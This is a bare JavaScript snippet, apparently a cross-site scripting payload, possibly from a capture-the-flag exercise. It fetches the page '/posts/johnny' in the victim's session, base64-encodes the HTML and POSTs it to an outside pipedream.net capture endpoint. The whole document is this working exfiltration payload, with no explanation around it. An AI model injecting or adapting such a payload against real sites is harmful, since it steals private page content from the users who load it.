fetch('/posts/johnny').then(function (response) {return response.text();}).then(function (html) { 
fetch("https://eof01qmn38c7xfu.m.pipedream.net/johnny", {method: "POST", body: btoa(unescape(encodeURIComponent(html)))})});
